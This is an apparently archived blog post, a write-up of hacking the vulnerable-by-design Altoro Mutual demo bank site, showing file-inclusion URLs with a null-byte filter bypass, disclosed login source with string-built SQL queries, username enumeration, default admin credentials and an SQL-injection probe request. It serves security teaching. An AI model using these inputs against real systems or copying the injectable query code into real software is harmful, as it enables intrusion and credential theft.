<!DOCTYPE html>
<html lang="en" prefix="og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml">
<head>
    <title>Hacking Altoro Mutual - blog.dornea.nu</title>
    <!-- Using the latest rendering mode for IE -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">




<style type="text/css">

/*some stuff for output/input prompts*/
div.cell{border:1px solid transparent;display:-webkit-box;-webkit-box-orient:vertical;-webkit-box-align:stretch;display:-moz-box;-moz-box-orient:vertical;-moz-box-align:stretch;display:box;box-orient:vertical;box-align:stretch;display:flex;flex-direction:column;align-items:stretch}div.cell.selected{border-radius:4px;border:thin #ababab solid}
div.cell.edit_mode{border-radius:4px;border:thin #008000 solid}
div.cell{width:100%;padding:5px 5px 5px 0;margin:0;outline:none}
div.prompt{min-width:11ex;padding:.4em;margin:0;font-family:monospace;text-align:right;line-height:1.21429em}
@media (max-width:480px){div.prompt{text-align:left}}div.inner_cell{display:-webkit-box;-webkit-box-orient:vertical;-webkit-box-align:stretch;display:-moz-box;-moz-box-orient:vertical;-moz-box-align:stretch;display:box;box-orient:vertical;box-align:stretch;display:flex;flex-direction:column;align-items:stretch;-webkit-box-flex:1;-moz-box-flex:1;box-flex:1;flex:1}
div.input_area{border:1px solid #cfcfcf;border-radius:4px;background:#f7f7f7;line-height:1.21429em}
div.prompt:empty{padding-top:0;padding-bottom:0}
div.input{page-break-inside:avoid;display:-webkit-box;-webkit-box-orient:horizontal;-webkit-box-align:stretch;display:-moz-box;-moz-box-orient:horizontal;-moz-box-align:stretch;display:box;box-orient:horizontal;box-align:stretch;}
div.inner_cell{width:90%;}
div.input_area{border:1px solid #cfcfcf;border-radius:4px;background:#f7f7f7;}
div.input_prompt{color:navy;border-top:1px solid transparent;}
div.output_wrapper{margin-top:5px;position:relative;display:-webkit-box;-webkit-box-orient:vertical;-webkit-box-align:stretch;display:-moz-box;-moz-box-orient:vertical;-moz-box-align:stretch;display:box;box-orient:vertical;box-align:stretch;width:100%;}
div.output_scroll{height:24em;width:100%;overflow:auto;border-radius:4px;-webkit-box-shadow:inset 0 2px 8px rgba(0, 0, 0, 0.8);-moz-box-shadow:inset 0 2px 8px rgba(0, 0, 0, 0.8);box-shadow:inset 0 2px 8px rgba(0, 0, 0, 0.8);}
div.output_collapsed{margin:0px;padding:0px;display:-webkit-box;-webkit-box-orient:vertical;-webkit-box-align:stretch;display:-moz-box;-moz-box-orient:vertical;-moz-box-align:stretch;display:box;box-orient:vertical;box-align:stretch;width:100%;}
div.out_prompt_overlay{height:100%;padding:0px 0.4em;position:absolute;border-radius:4px;}
div.out_prompt_overlay:hover{-webkit-box-shadow:inset 0 0 1px #000000;-moz-box-shadow:inset 0 0 1px #000000;box-shadow:inset 0 0 1px #000000;background:rgba(240, 240, 240, 0.5);}
div.output_prompt{color:darkred;}

a.anchor-link:link{text-decoration:none;padding:0px 20px;visibility:hidden;}
h1:hover .anchor-link,h2:hover .anchor-link,h3:hover .anchor-link,h4:hover .anchor-link,h5:hover .anchor-link,h6:hover .anchor-link{visibility:visible;}
/* end stuff for output/input prompts*/


.highlight-ipynb .hll { background-color: #ffffcc }
.highlight-ipynb  { background: #f8f8f8; }
.highlight-ipynb .c { color: #408080; font-style: italic } /* Comment */
.highlight-ipynb .err { border: 1px solid #FF0000 } /* Error */
.highlight-ipynb .k { color: #008000; font-weight: bold } /* Keyword */
.highlight-ipynb .o { color: #666666 } /* Operator */
.highlight-ipynb .cm { color: #408080; font-style: italic } /* Comment.Multiline */
.highlight-ipynb .cp { color: #BC7A00 } /* Comment.Preproc */
.highlight-ipynb .c1 { color: #408080; font-style: italic } /* Comment.Single */
.highlight-ipynb .cs { color: #408080; font-style: italic } /* Comment.Special */
.highlight-ipynb .gd { color: #A00000 } /* Generic.Deleted */
.highlight-ipynb .ge { font-style: italic } /* Generic.Emph */
.highlight-ipynb .gr { color: #FF0000 } /* Generic.Error */
.highlight-ipynb .gh { color: #000080; font-weight: bold } /* Generic.Heading */
.highlight-ipynb .gi { color: #00A000 } /* Generic.Inserted */
.highlight-ipynb .go { color: #888888 } /* Generic.Output */
.highlight-ipynb .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
.highlight-ipynb .gs { font-weight: bold } /* Generic.Strong */
.highlight-ipynb .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
.highlight-ipynb .gt { color: #0044DD } /* Generic.Traceback */
.highlight-ipynb .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
.highlight-ipynb .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
.highlight-ipynb .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
.highlight-ipynb .kp { color: #008000 } /* Keyword.Pseudo */
.highlight-ipynb .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
.highlight-ipynb .kt { color: #B00040 } /* Keyword.Type */
.highlight-ipynb .m { color: #666666 } /* Literal.Number */
.highlight-ipynb .s { color: #BA2121 } /* Literal.String */
.highlight-ipynb .na { color: #7D9029 } /* Name.Attribute */
.highlight-ipynb .nb { color: #008000 } /* Name.Builtin */
.highlight-ipynb .nc { color: #0000FF; font-weight: bold } /* Name.Class */
.highlight-ipynb .no { color: #880000 } /* Name.Constant */
.highlight-ipynb .nd { color: #AA22FF } /* Name.Decorator */
.highlight-ipynb .ni { color: #999999; font-weight: bold } /* Name.Entity */
.highlight-ipynb .ne { color: #D2413A; font-weight: bold } /* Name.Exception */
.highlight-ipynb .nf { color: #0000FF } /* Name.Function */
.highlight-ipynb .nl { color: #A0A000 } /* Name.Label */
.highlight-ipynb .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
.highlight-ipynb .nt { color: #008000; font-weight: bold } /* Name.Tag */
.highlight-ipynb .nv { color: #19177C } /* Name.Variable */
.highlight-ipynb .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
.highlight-ipynb .w { color: #bbbbbb } /* Text.Whitespace */
.highlight-ipynb .mf { color: #666666 } /* Literal.Number.Float */
.highlight-ipynb .mh { color: #666666 } /* Literal.Number.Hex */
.highlight-ipynb .mi { color: #666666 } /* Literal.Number.Integer */
.highlight-ipynb .mo { color: #666666 } /* Literal.Number.Oct */
.highlight-ipynb .sb { color: #BA2121 } /* Literal.String.Backtick */
.highlight-ipynb .sc { color: #BA2121 } /* Literal.String.Char */
.highlight-ipynb .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
.highlight-ipynb .s2 { color: #BA2121 } /* Literal.String.Double */
.highlight-ipynb .se { color: #BB6622; font-weight: bold } /* Literal.String.Escape */
.highlight-ipynb .sh { color: #BA2121 } /* Literal.String.Heredoc */
.highlight-ipynb .si { color: #BB6688; font-weight: bold } /* Literal.String.Interpol */
.highlight-ipynb .sx { color: #008000 } /* Literal.String.Other */
.highlight-ipynb .sr { color: #BB6688 } /* Literal.String.Regex */
.highlight-ipynb .s1 { color: #BA2121 } /* Literal.String.Single */
.highlight-ipynb .ss { color: #19177C } /* Literal.String.Symbol */
.highlight-ipynb .bp { color: #008000 } /* Name.Builtin.Pseudo */
.highlight-ipynb .vc { color: #19177C } /* Name.Variable.Class */
.highlight-ipynb .vg { color: #19177C } /* Name.Variable.Global */
.highlight-ipynb .vi { color: #19177C } /* Name.Variable.Instance */
.highlight-ipynb .il { color: #666666 } /* Literal.Number.Integer.Long */
</style>

<style type="text/css">
/* Overrides of notebook CSS for static HTML export */
div.entry-content {
  overflow: visible;
  padding: 8px;
}
.input_area {
  padding: 0.2em;
}

a.heading-anchor {
 white-space: normal;
}

.rendered_html
code {
 font-size: .8em;
}

pre.ipynb {
  color: black;
  background: #f7f7f7;
  border: none;
  box-shadow: none;
  margin-bottom: 0;
  padding: 0;
  margin: 0px;
  font-size: 13px;
}

/* remove the prompt div from text cells */
div.text_cell .prompt {
    display: none;
}

/* remove horizontal padding from text cells, */
/* so it aligns with outer body text */
div.text_cell_render {
    padding: 0.5em 0em;
}

img.anim_icon{padding:0; border:0; vertical-align:middle; -webkit-box-shadow:none; -box-shadow:none}
</style>

<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML" type="text/javascript"></script>
<script type="text/javascript">
init_mathjax = function() {
    if (window.MathJax) {
        // MathJax loaded
        MathJax.Hub.Config({
            tex2jax: {
                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
                displayMath: [ ['$$','$$'], ["\\[","\\]"] ]
            },
            displayAlign: 'left', // Change this to 'center' to center equations.
            "HTML-CSS": {
                styles: {'.MathJax_Display': {"margin": 0}}
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub]);
    }
}
init_mathjax();
</script>

<link rel="canonical" href="http://blog.dornea.nu/2013/05/06/hacking-altoro-mutual">

        <meta name="author" content="Victor" />
        <meta name="keywords" content="hacking,security,wargames,web" />
        <meta name="description" content="Contents 1 IntroductionÂ 2 Vulnerabilities by URL 2.1 /default.aspx?content= 2.2 /bank 2.3 /bank/login.aspx 2.3.1 Brute force vulnerability 2.3.2 SQL injection using POST parameters 2.3.3 Base64-encoded login credentials 2.4 /bank/main.aspxÂ 2.4.1 Source code ..." />

        <meta property="og:site_name" content="blog.dornea.nu" />
        <meta property="og:type" content="article"/>
        <meta property="og:title" content="Hacking Altoro Mutual"/>
        <meta property="og:url" content="http://blog.dornea.nu/2013/05/06/hacking-altoro-mutual"/>
        <meta property="og:description" content="Contents 1 IntroductionÂ 2 Vulnerabilities by URL 2.1 /default.aspx?content= 2.2 /bank 2.3 /bank/login.aspx 2.3.1 Brute force vulnerability 2.3.2 SQL injection using POST parameters 2.3.3 Base64-encoded login credentials 2.4 /bank/main.aspxÂ 2.4.1 Source code ..."/>
        <meta property="article:published_time" content="2013-05-06" />
            <meta property="article:section" content="blog" />
            <meta property="article:tag" content="hacking" />
            <meta property="article:tag" content="security" />
            <meta property="article:tag" content="wargames" />
            <meta property="article:tag" content="web" />
            <meta property="article:author" content="Victor" />

    <meta name="twitter:card" content="summary">
        <meta name="twitter:site" content="@victordorneanu">
        <meta name="twitter:creator" content="@victordorneanu">
    <meta name="twitter:domain" content="http://blog.dornea.nu">

    <!-- Bootstrap -->
        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/bootstrap.spacelab.min.css" type="text/css"/>
    <link href="http://blog.dornea.nu/theme/css/font-awesome.min.css" rel="stylesheet">

    <link href="http://blog.dornea.nu/theme/css/pygments/native.css" rel="stylesheet">
    <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/style.css" type="text/css"/>

        <link href="http://blog.dornea.nu/feeds/all.atom.xml" type="application/atom+xml" rel="alternate"
              title="blog.dornea.nu ATOM Feed"/>




</head>
<body>

<div class="navbar navbar-default navbar-fixed-top" role="navigation">
	<div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a href="http://blog.dornea.nu/" class="navbar-brand">
blog.dornea.nu            </a>
        </div>
        <div class="collapse navbar-collapse navbar-ex1-collapse">
            <ul class="nav navbar-nav">
                    <li><a href="/archives">Archives</a></li>
                    <li><a href="http://dornea.nu">About</a></li>
                         <li><a href="http://blog.dornea.nu/pages/books">
                             Books
                          </a></li>
                        <li class="active">
                            <a href="http://blog.dornea.nu/category/blog">Blog</a>
                        </li>
                        <li >
                            <a href="http://blog.dornea.nu/category/notes">Notes</a>
                        </li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
              <li><a href="http://blog.dornea.nu/archives"><i class="fa fa-th-list"></i><span class="icon-label">Archives</span></a></li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
</div> <!-- /.navbar -->
<!-- Banner -->
<!-- End Banner -->
<div class="container">
    <div class="row">
        <div class="col-sm-9">
            <ol class="breadcrumb">
                <li><a href="http://blog.dornea.nu" title="blog.dornea.nu"><i class="fa fa-home fa-lg"></i></a></li>
                <li><a href="http://blog.dornea.nu/category/blog" title="blog">blog</a></li>
                <li class="active">Hacking Altoro Mutual</li>
            </ol>
    <section id="content">
        <article>
            <header class="page-header">
                <h1>
                    <a href="http://blog.dornea.nu/2013/05/06/hacking-altoro-mutual"
                       rel="bookmark"
                       title="Permalink to Hacking Altoro Mutual">
                        Hacking Altoro Mutual
                    </a>
                </h1>
            </header>
            <div class="entry-content">
                <div class="panel">
                    <div class="panel-body">
<footer class="post-info">
    <span class="label label-default">Date</span>
    <span class="published">
        <i class="fa fa-calendar"></i><time datetime="2013-05-06T00:00:00+02:00"> Mon 06 May 2013</time>
    </span>



        <span class="label label-default">Category</span>
        <a href="http://blog.dornea.nu/category/blog">blog</a>


<span class="label label-default">Tags</span>
	<a href="http://blog.dornea.nu/tag/hacking/">hacking</a>
        /
	<a href="http://blog.dornea.nu/tag/security/">security</a>
        /
	<a href="http://blog.dornea.nu/tag/wargames/">wargames</a>
        /
	<a href="http://blog.dornea.nu/tag/web/">web</a>
    
</footer><!-- /.post-info -->                    </div>
                </div>
                <div id="toc_container" class="toc_wrap_right toc_transparent no_bullets">
  <p class="toc_title">
    Contents
  </p>

  <ul class="toc_list">
    <li>
      <a href="#Introduction"><span class="toc_number toc_depth_1">1</span> IntroductionÂ </a>
    </li>
    <li>
      <a href="#Vulnerabilities_by_URL"><span class="toc_number toc_depth_1">2</span> Vulnerabilities by URL</a><ul>
        <li>
          <a href="#defaultaspxcontent"><span class="toc_number toc_depth_2">2.1</span> /default.aspx?content=</a>
        </li>
        <li>
          <a href="#bank"><span class="toc_number toc_depth_2">2.2</span> /bank</a>
        </li>
        <li>
          <a href="#bankloginaspx"><span class="toc_number toc_depth_2">2.3</span> /bank/login.aspx</a><ul>
            <li>
              <a href="#Brute_force_vulnerability"><span class="toc_number toc_depth_3">2.3.1</span> Brute force vulnerability</a>
            </li>
            <li>
              <a href="#SQL_injection_using_POST_parameters"><span class="toc_number toc_depth_3">2.3.2</span> SQL injection using POST parameters</a>
            </li>
            <li>
              <a href="#Base64-encoded_login_credentials"><span class="toc_number toc_depth_3">2.3.3</span> Base64-encoded login credentials</a>
            </li>
          </ul>
        </li>

        <li>
          <a href="#bankmainaspx"><span class="toc_number toc_depth_2">2.4</span> /bank/main.aspxÂ </a><ul>
            <li>
              <a href="#Source_code_disclosure"><span class="toc_number toc_depth_3">2.4.1</span> Source code disclosure</a>
            </li>
            <li>
              <a href="#SQL_injection_using_Cookie_data"><span class="toc_number toc_depth_3">2.4.2</span> SQL injection using Cookie data</a>
            </li>
            <li>
              <a href="#XSS_using_cookie_data"><span class="toc_number toc_depth_3">2.4.3</span> XSS using cookie data</a>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</div>

<h1 id="Introduction"><span id="Introduction">IntroductionÂ </span></h1>
<hr />
<p>AltoroMutual is an vulnerable-by-design web application created byÂ !WatchFire (nowÂ !AppScan Standard) as a demo test application for theirÂ !BlackBox Scanner. (Source:<a href="https://www.owasp.org/index.php/AltoroMutual">https://www.owasp.org/index.php/AltoroMutual</a>)</p>
<p>The demo can be found atÂ <a href="http://demo.testfire.net/">http://demo.testfire.net/</a>.</p>
<p><strong>This is not an usual wargame!</strong>Â I have simply not found an appropriate name for it.<!--more--></p>
<p>&nbsp;</p>
<h1 id="Vulnerabilities_by_URL"><span id="Vulnerabilities_by_URL">Vulnerabilities by URL</span></h1>
<hr />
<p>&nbsp;</p>
<h2 id="A.2Fdefault.aspx.3Fcontent.3D"><span id="defaultaspxcontent">/default.aspx?content=</span></h2>
<hr />
<p>There is aÂ <strong>file inclusion vulnerability</strong>Â which we&#8217;ll use for further investigation. URLÂ <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em>Â will show:</p>
<pre>An Error Has Occurred
Summary:
Could not find file 'D:downloadsAltoroMutual_v6website  esting.txt'.
Error Message:
System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6website esting.txt'. File name: 'D:downloadsAltoroMutual_v6website  esting.txt' at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy) at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options) at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize) at System.IO.StreamReader..ctor(String path) at System.IO.File.OpenText(String path) at Altoro.Default.LoadFile(String myFile) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 42 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 70 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</pre>

<p>As you can see we have found the root path of the web application which is atÂ <strong>D:downloads!AltoroMutual_v6website</strong>.</p>
<p><a href="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png"><br />
<img title="attachment:default.aspx.png" alt="File inclusion vulnerability" src="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" width="1007" height="548" /></a></p>
<p>&nbsp;</p>
<h2 id="A.2Fbank"><span id="bank">/bank</span></h2>
<hr />
<p>You&#8217;ll find aÂ <strong>directory listening</strong>Â atÂ <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a>Â which will show you a lot of information about the applications functionalities.</p>
<pre>5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
 1/12/2011 10:14 PM         1831 account.aspx
 1/12/2011 10:14 PM         4277 account.aspx.cs
 1/12/2011 10:14 PM          771 apply.aspx
 1/12/2011 10:14 PM         2828 apply.aspx.cs
 1/12/2011 10:14 PM         2236 bank.master
 1/12/2011 10:14 PM         1134 bank.master.cs
 1/12/2011 10:14 PM          904 customize.aspx
 1/12/2011 10:14 PM         1955 customize.aspx.cs
 1/12/2011 10:14 PM         1806 login.aspx
 1/12/2011 10:14 PM         5847 login.aspx.cs
 1/12/2011 10:14 PM           78 logout.aspx
 1/12/2011 10:14 PM         3361 logout.aspx.cs
 1/12/2011 10:14 PM          935 main.aspx
 1/12/2011 10:14 PM         3951 main.aspx.cs
 5/31/2007 11:10 AM        &lt;dir&gt; members
 1/12/2011 10:14 PM         1414 mozxpath.js
 6/21/2011 10:29 PM          779 queryxpath.aspx
 1/12/2011 10:14 PM         1838 queryxpath.aspx.cs
 1/12/2011 10:14 PM          499 servererror.aspx
 1/12/2011 10:14 PM         1700 transaction.aspx
 1/12/2011 10:14 PM         3826 transaction.aspx.cs
 1/12/2011 10:14 PM         3930 transfer.aspx
 1/12/2011 10:14 PM         3505 transfer.aspx.cs
 1/12/2011 10:14 PM           82 ws.asmx
</pre>

<p>Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:</p>
<pre>An Error Has Occurred
Summary:
An unknown error occurred.
Error Message:
</pre>

<p><a href="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png"><img title="attachment:cant_access_files.png" alt="File inclusion vulnerability" src="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" width="NaN" height="451" /></a></p>
<p>So you&#8217;ll have to find another way to get to the files. We&#8217;ll use theÂ <strong>file inclusion vulnerability</strong>Â found before to do that.</p>
<p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a>Â will result in</p>
<pre>Error! File must be of type TXT or HTM
</pre>

<p>We&#8217;ll have to bypass the filter in order to get the file. Remember theÂ <strong>null string vulnerability</strong>? Here we go:Â <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
<p><a href="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png"><img title="attachment:null_string.png" alt="Null string vulnerability" src="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" width="NaN" height="578" /></a></p>
<p>That will show you the content ofÂ <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
<p>&nbsp;</p>
<h2 id="A.2Fbank.2Flogin.aspx"><span id="bankloginaspx">/bank/login.aspx</span></h2>
<hr />
<p>Â Source code disclosure</p>
<p>Here is the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>):</p>
<pre>using System.Data;
using System.Data.SqlClient;
using System.Data.OleDb;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
  public partial class Authentication : Page
  {
    protected void Page_Load(object sender, System.EventArgs e)
    {
      // Put user code to initialize the page here
      Response.Cache.SetCacheability(HttpCacheability.NoCache);
      HtmlMeta meta = new HtmlMeta();
      HtmlHead head = (HtmlHead)Page.Header;
      meta.Name = "keywords";
      meta.Content = "Altoro Mutual Login, login, authenticate";
      head.Controls.Add(meta);
      if(Request.Params["passw"] != null)
      {
        String uname = Request.Params["uid"];
        String passwd = Request.Params["passw"];
        String msg = ValidateUser(uname, passwd);
        if (msg == "Success")
        {
            Response.Redirect("main.aspx");
        }
        else
        {
          message.Text = "Login Failed: " + msg;
        }
      }
    }
    protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = "Success";
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
      myConnection.Open();
      string query2 = "SELECT * From users WHERE username = '" + uName + "'";
      string query1 = query2 + " AND password = '" + pWord + "'";
      if (ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString.Contains("Microsoft.Jet.OLEDB.4.0"))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, "--.*", "");
          query2 = Regex.Replace(query2, "--.*", "");
      }
      DataSet ds = new DataSet();
      OleDbDataAdapter myLogin = new OleDbDataAdapter(query1, myConnection);
      myLogin.Fill(ds, "user");
      if (ds.Tables["user"].Rows.Count==0)
      {
              OleDbDataAdapter myFailed = new OleDbDataAdapter(query2, myConnection);
              myFailed.Fill(ds, "user");
        if (ds.Tables["user"].Rows.Count==0)
        {
             status = "We're sorry, but this username was not found in our system.  Please try again.";
        }
        else
        {
            status = "Your password appears to be invalid.  Please re-enter your password carefully.";
        }
      }
      else
      {
                //Get the row returned by the query
                DataRow myRow = ds.Tables["user"].Rows[0];
          //Set the Session variables.
          Session["userId"] = myRow["userid"];
          Session["userName"] = myRow["username"];
          Session["firstName"] = myRow["first_name"];
          Session["lastName"] = myRow["last_name"];
          Session["authenticated"] = true;
          //Close the database collection.
          myConnection.Close();
          //Set UserInfo cookie
          DateTime dtNow = DateTime.Now;
          TimeSpan tsHour = new TimeSpan(0, 0, 180, 0);
          string sCookieUser = new Base64Decoder(uName).GetDecoded();
          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
          if ((UserInfo == null) || (sCookieUser != Session["userName"].ToString()))
          {
              UserInfo = new HttpCookie("amUserInfo");
              UserInfo["UserName"] = new Base64Encoder(uName).GetEncoded();
              UserInfo["Password"] = new Base64Encoder(pWord).GetEncoded();
              UserInfo.Expires = dtNow.Add(tsHour);
              Response.Cookies.Add(UserInfo);
          }
          HttpCookie UserId = Request.Cookies["amUserId"];
          UserId = new HttpCookie("amUserId");
          UserId.Value = Session["userId"].ToString();
          Response.Cookies.Add(UserId);
          query1 = "SELECT userid, approved, card_type,interest, limit FROM promo WHERE userid=" + Session["userId"];
          OleDbDataAdapter myApproval = new OleDbDataAdapter(query1, myConnection);
          myApproval.Fill(ds, "promo");
          DataTable myTable = ds.Tables["promo"];
          DataRow curRow = myTable.Rows[0];
          if (System.Convert.ToBoolean(curRow["approved"]))
          {
            HttpCookie CreditOffer = Request.Cookies["amCreditOffer"];
                CreditOffer = new HttpCookie("amCreditOffer");
            CreditOffer["CardType"] = curRow["card_type"].ToString();
            CreditOffer["Limit"] = curRow["limit"].ToString();
            CreditOffer["Interest"] = curRow["interest"].ToString();
                Response.Cookies.Add(CreditOffer);
          }
      }
      myConnection.Close();
      return status;
    }
      protected string GetUserName()
      {
          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
          if (Request.Params["uid"] != null)
          {
              return Request.Params["uid"].ToString();
          }
          if (UserInfo != null)
          {
              return new Base64Decoder(UserInfo["UserName"]).GetDecoded();
          }
          else
          {
              return "";
          }
      }
    #region Web Form Designer generated code
    override protected void OnInit(EventArgs e)
    {
      //
      // CODEGEN: This call is required by the ASP.NET Web Form Designer.
      //
      InitializeComponent();
      base.OnInit(e);
    }
    /// &lt;summary&gt;
    /// Required method for Designer support - do not modify
    /// the contents of this method with the code editor.
    /// &lt;/summary&gt;
    private void InitializeComponent()
    {
    }
    #endregion
  }
}
</pre>

<p>&nbsp;</p>
<h3 id="Brute_force_vulnerability"><span id="Brute_force_vulnerability">Brute force vulnerability</span></h3>
<p>Before we investigate the code, let&#8217;s have a look at a much common vulnerability. Go toÂ <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a>Â and use a random user for the login process. You&#8217;ll get:</p>
<pre>Login Failed: We're sorry, but this username was not found in our system. Please try again.
</pre>

<p><a href="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png"><img title="attachment:login_bad_username.png" alt="Username bruteforce vulnerability" src="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" width="NaN" height="581" /></a></p>
<p>You could now easilyÂ <strong>bruteforce</strong>Â common usernames in order to login into the application. The same works with passwords too:Â <em>admin</em>Â seems to be a valid username. Try to bruteforce the password and you&#8217;ll get:</p>
<pre>Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
</pre>

<p><a href="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png"><img title="attachment:login_bad_password.png" alt="Password bruteforce vulnerability" src="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" width="NaN" height="579" /></a></p>
<p><em>admin:admin</em>Â is a valid username/password combinationÂ <img title="smiley::-)" alt=":-)" src="http://dornea.nu/moin_static196/mandarin/img/smile.png" width="16" height="16" /></p>
<p>&nbsp;</p>
<h3 id="SQL_injection_using_POST_parameters"><span id="SQL_injection_using_POST_parameters">SQL injection using POST parameters</span></h3>
<p>Now let&#8217;s have a closer look at the source code&#8230; Let&#8217;s analyze theÂ <em>!ValidateUser</em>Â function:</p>
<pre>protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = "Success";
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
      myConnection.Open();
      string query2 = "SELECT * From users WHERE username = '" + uName + "'";
      string query1 = query2 + " AND password = '" + pWord + "'";
      if (ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString.Contains("Microsoft.Jet.OLEDB.4.0"))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, "--.*", "");
          query2 = Regex.Replace(query2, "--.*", "");
      }
      ....
</pre>

<p>As you can see theÂ <em>uName</em>Â parameter doesn&#8217;t get sanitized, so you can easily run someÂ <strong>SQL injection</strong>. Let&#8217;s try that out. UsingÂ <a href="http://www.portswigger.net/burp/">Burpsuite</a>Â we&#8217;ll tamper data sent to the web server and analyze the responses.</p>
<p>Here&#8217;s the request:</p>
<pre>POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
uid=admin%27&passw=test&btnSubmit=Login
</pre>

<p>As a response you&#8217;ll get:</p>
<pre>An Error Has Occurred
Summary:
Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''.
Error Message:
